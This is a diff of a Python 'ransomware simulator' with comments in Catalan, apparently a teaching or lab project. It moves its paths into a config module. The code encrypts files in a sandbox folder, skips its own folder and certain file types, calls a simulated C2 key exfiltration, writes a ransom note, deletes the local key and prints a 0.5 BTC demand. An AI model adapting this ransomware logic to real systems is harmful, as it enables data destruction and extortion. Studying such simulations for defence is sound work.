@@ -1,14 +1,14 @@
 import os
+import tkinter
 import file_manager                 
 import crypto_engine
-import tkinter
+import config 
+
 
 # --- CONFIGURACIO I CONSTANTS ---
-RUTA_SANDBOX = "sandbox"
-RUTA_CLAU = "config_sys_04.dat"
 PROHIBITED_WHITELIST = [".py", ".key", ".exe", ".dll", ".sys", ".locked", ".ini", ".lnk", ".bat", ".dat"]
 
-RUTA_PROPIA = os.path.dirname(os.path.abspath(__file__))
+
 
 def simular_exfiltracio_clau() -> None:
 #Simula l'enviament de la clau a un servidor C2 remot
@@ -27,6 +27,8 @@ def mostrar_menu():
         print("\n" + "=" * 32)
         print("    SIMULADOR DE RANSOMWARE")    
         print("=" * 32)
+        print(f"Zona Objectiu: {config.SAND_DIR}")
+        print("-" * 32)
         print("1. Infectar (Xifrar)")          
         print("2. Recuperar (Desxifrar)")       
         print("3. Veure historial (Logs)")      
@@ -35,30 +37,32 @@ def mostrar_menu():
         opcio = input("\nTria una opcio (1-4): ")        
         
         if opcio == "1":
-            file_manager.registrar_log("INICIANT INFECCIO", "INFO",{"target_dir": RUTA_SANDBOX})
+            file_manager.registrar_log("INICIANT INFECCIO", "INFO",{"target_dir": config.SAND_DIR})
             
             total_xifrats = 0
             total_errors = 0
 
-            if not os.path.exists(RUTA_SANDBOX):
-                print("[X] ERROR: NO EXISTEIX EL FOLDER SANDBOX")
+            if not os.path.exists(config.SAND_DIR):
+                print(f"[X] ERROR: NO EXISTEIX EL FOLDER SANDBOX: {config.SAND_DIR}")
+                os.makedirs(config.SAND_DIR, exist_ok=True)
+                print("[i] S'ha creat la carpeta buida. Posa-hi fitxers per xifrar.")
                 continue
                 
             # Generacio i Exfiltracio (SDR-16)
             print("\n[+] GENERANT ALGORITME DE SEGURETAT...")
-            crypto_engine.generar_i_guardar_clau(RUTA_CLAU)
+            crypto_engine.generar_i_guardar_clau(config.FILE_KEY)
             simular_exfiltracio_clau()
             
-            clau = crypto_engine.carregar_clau(RUTA_CLAU)
-            llista_arxius = file_manager.llistar_fitxers(RUTA_SANDBOX)
+            clau = crypto_engine.carregar_clau(config.FILE_KEY)
+            llista_arxius = file_manager.llistar_fitxers(config.SAND_DIR)
 
             for ruta_completa in llista_arxius:
                 # SDR-24: Filtre de carpeta per no xifrar el propi codi
                 carpeta_fitxer = os.path.dirname(os.path.abspath(ruta_completa))
-                if carpeta_fitxer == RUTA_PROPIA:
+                if config.CURR_DIR in carpeta_fitxer:
                     continue
 
-                # Filtre d extensions
+                # Filtre de extensions
                 nom_arxiu, extensio = os.path.splitext(ruta_completa)
                 if extensio.lower() in PROHIBITED_WHITELIST:
                     continue
@@ -81,31 +85,31 @@ def mostrar_menu():
                 "total_fails": total_errors
             })
 
-            file_manager.generar_nota_rescat(RUTA_SANDBOX)
+            file_manager.generar_nota_rescat(config.SAND_DIR)
 
             # SDR-16: Autodestruccio de la clau local
-            if os.path.exists(RUTA_CLAU):
-                os.remove(RUTA_CLAU)
+            if os.path.exists(config.FILE_KEY):
+                os.remove(config.FILE_KEY)
                 print("\n[!] ATENCIO: Clau local destruida per seguretat.")
                 file_manager.registrar_log("CLAU LOCAL ELIMINADA", "CRITICAL")
             
-            print(f"\n[V] INFECCIO COMPLETADA A {RUTA_SANDBOX}")
+            print(f"\n[V] INFECCIO COMPLETADA A {config.SAND_DIR}")
 
         elif opcio == "2":
-            clau = crypto_engine.carregar_clau(RUTA_CLAU)
+            clau = crypto_engine.carregar_clau(config.FILE_KEY)
             
             if not clau:
                 # SDR-16: El missatge de rescat si no hi ha clau
                 print("\n" + "!" * 40)
                 print("!!  SISTEMA DE RECUPERACIO BLOQUEJAT  !!")
-                print("No s ha trobat la clau: config_sys_04.dat")
+                print(f"No s ha trobat la clau a: {config.FILE_KEY}")
                 print("Rescat: Envia 0.5 BTC a l adreca del servidor C2.")
                 print("!" * 40)
                 file_manager.registrar_log("INTENT DE RECUPERACIO SENSE CLAU", "WARNING")
                 continue
 
             # Recuperacio si tenim la clau manualment
-            llista_arxius = file_manager.llistar_fitxers(RUTA_SANDBOX)
+            llista_arxius = file_manager.llistar_fitxers(config.SAND_DIR)
             arxius_recuperats = 0
             arxius_error = 0
             total_detectats = 0
